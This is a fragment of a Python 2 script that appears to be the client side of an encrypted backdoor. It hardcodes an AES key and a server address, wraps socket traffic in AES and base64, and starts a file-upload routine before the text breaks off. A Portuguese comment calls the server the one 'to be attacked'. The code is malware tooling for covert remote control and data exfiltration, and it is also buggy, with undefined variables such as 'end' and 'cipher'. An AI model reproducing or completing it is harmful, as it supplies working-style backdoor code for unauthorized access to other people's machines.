from Crypto.Cipher import AES
import subprocess, socket, base64, time, os, sys, urllib2, pythoncom

BLOCK_SIZE = 32

EndcodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

secret_key = "TkcR4sa2zA4A1c3Fg7s3D4s2A4s2A4s2"

# your server config(configure o servidor para ser atacado)
HOST = '255.255.255.255'
PORT = 8000

active = False

def send_data_to_server(sock, cmd, end='EOFEOFEOFEOFEOFX'):
    sock.send(EndcodeAES(cipher, cmd + end))

def receive_data_from_server(sock):
    data = ""

    rhombus = sock.recv(1024)

    while(rhombus):
        Decrypted = DecodeAES(cipher, rhombus)
        data = data + Decrypted
        if data.endswith(end) == True:
            break
        else:
            rhombus = sock.recv(1024)

    return data[:-len(end)]

def prompt(sock, promptmsg):
    send_data_to_server(sock, promptmsg)
    answer = receive_data_from_server(sock)
    return answer

def upload_file(sock, file_name):
    bgrt = True